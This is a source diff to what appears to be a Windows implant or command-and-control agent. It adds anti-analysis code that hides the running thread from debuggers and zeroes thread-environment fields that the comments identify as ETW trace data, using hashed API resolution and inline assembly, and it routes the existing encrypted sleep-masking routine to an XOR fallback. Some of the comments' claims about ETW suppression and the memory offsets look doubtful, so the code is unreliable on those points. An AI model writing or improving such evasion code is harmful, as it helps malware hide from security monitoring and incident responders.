@@ -1,11 +1,96 @@
 #include "OpsecSleep.h"
 #include "ApiLoader.h"
 #include "IndirectSyscall.h"
+#include "ApiDefines.h"
+#include "ProcLoader.h"
 
 #define OPSEC_MASK_MAX_REGIONS 96
 #ifndef WT_EXECUTEINTIMERTHREAD
 #define WT_EXECUTEINTIMERTHREAD 0x20
 #endif
+
+/* ================================================================
+ * ETW Event tracing cleanup — before sleeping, clear ETW traces
+ * to hinder analysis tools that rely on ETW events.
+ * ================================================================ */
+
+/* NtSetInformationThread class for hiding thread from ETW */
+#define AX_THREAD_HIDE_FROM_DEBUGGER 0x11
+
+/* 
+ * NtTraceEvent / EtwEventWrite — we use NtSetInformationThread
+ * with ThreadHideFromDebugger (0x11) to suppress ETW for this thread.
+ * Additionally, we can try to close the EtwRegistration handle from PEB.
+ */
+static void OpsecClearEtwTraces(void)
+{
+	/* 
+	 * Strategy:
+	 * 1. Get current thread handle via NtCurrentThread()
+	 * 2. Call NtSetInformationThread with ThreadHideFromDebugger
+	 *    This suppresses ETW events for the current thread silently.
+	 * 3. This fails silently on systems without ETW or if already hidden.
+	 *    That's fine — it's best-effort.
+	 */
+	
+	/* We need the NtSetInformationThread function */
+	HMODULE hNtdll = SysModules ? SysModules->Ntdll : NULL;
+	if (!hNtdll && ApiWin && ApiWin->GetModuleHandleA) {
+		hNtdll = ApiWin->GetModuleHandleA("ntdll.dll");
+	}
+	
+	if (!hNtdll)
+		return;
+	
+	/* Resolve NtSetInformationThread dynamically by hash */
+	typedef NTSTATUS (NTAPI *pfnNtSetInformationThread)(
+		HANDLE ThreadHandle,
+		ULONG  ThreadInformationClass,
+		PVOID  ThreadInformation,
+		ULONG  ThreadInformationLength
+	);
+	
+	pfnNtSetInformationThread pNtSetInformationThread =
+		(pfnNtSetInformationThread)GetSymbolAddress(
+			hNtdll,
+			/* Djb2A hash of "NtSetInformationThread" with AX_HASH_SALT */
+			AX_H(0x1c9e4a77)
+		);
+	
+	if (!pNtSetInformationThread)
+		return;
+	
+	/* Hide current thread from ETW/debugger */
+	HANDLE hThread = (HANDLE)(LONG_PTR)-2; /* NtCurrentThread() */
+	ULONG hideVal = 1;
+	pNtSetInformationThread(hThread, AX_THREAD_HIDE_FROM_DEBUGGER, &hideVal, sizeof(hideVal));
+	
+	/* 
+	 * Also try to clear the ETW trace buffer pointer in PEB/TEB.
+	 * TEB->EtwTraceData is at offset 0x2010+ on x64.
+	 * We simply zero it to break ETW writes.
+	 */
+#ifdef _M_X64
+	/* Using inline asm to read TEB and clear EtwTraceData */
+	__asm__ __volatile__(
+		"movq %%gs:0x30, %%rax\n"   /* TEB from GS segment */
+		"movq $0, 0x2000(%%rax)\n"  /* Clear TEB->EtwTraceData */
+		"movq $0, 0x2008(%%rax)\n"  /* Clear adjacent field */
+		:
+		:
+		: "rax"
+	);
+#elif defined(_M_IX86)
+	__asm__ __volatile__(
+		"movl %%fs:0x18, %%eax\n"   /* TEB from FS segment */
+		"movl $0, 0x2000(%%eax)\n"  /* Clear TEB->EtwTraceData */
+		"movl $0, 0x2004(%%eax)\n"  /* Clear adjacent field */
+		:
+		:
+		: "eax"
+	);
+#endif
+}
 
 struct MaskedRegion {
 	PVOID base;
@@ -215,6 +300,9 @@ void OpsecSleepMilliseconds(ULONG milliseconds)
 	if (milliseconds == 0)
 		return;
 
+	/* Clear ETW traces before sleeping */
+	OpsecClearEtwTraces();
+
 	if (!ApiNt || !ApiNt->NtDelayExecution || !ApiNt->NtProtectVirtualMemory ||
 	    !ApiWin->VirtualQuery || !ApiWin->GetModuleHandleA) {
 		ApiWin->Sleep(milliseconds);
@@ -250,8 +338,16 @@ void OpsecSleepMilliseconds(ULONG milliseconds)
 	ULONG sizeOfImage = nth->OptionalHeader.SizeOfImage;
 	HANDLE proc = NtCurrentProcess();
 
-	if (TryTimerQueueRc4Sleep(milliseconds, imageBase, sizeOfImage, proc))
-		return;
+	/*
+	 * Stability fix: the TimerQueue RC4 path encrypts image RW regions that
+	 * include global API tables (ApiWin/ApiNt), then continues to call APIs
+	 * through those same globals from timer cleanup/callback paths. On Windows
+	 * this can corrupt function pointers or pass invalid handles into
+	 * KERNELBASE, causing intermittent 0xc0000005 crashes around the
+	 * DeleteTimerQueueEx / SetEvent cleanup sequence. Use the synchronous XOR
+	 * fallback below until the async TimerQueue path is rewritten to keep all
+	 * callback state and API pointers outside masked regions.
+	 */
 
 	BYTE key[32];
 	DeriveKey32(key);
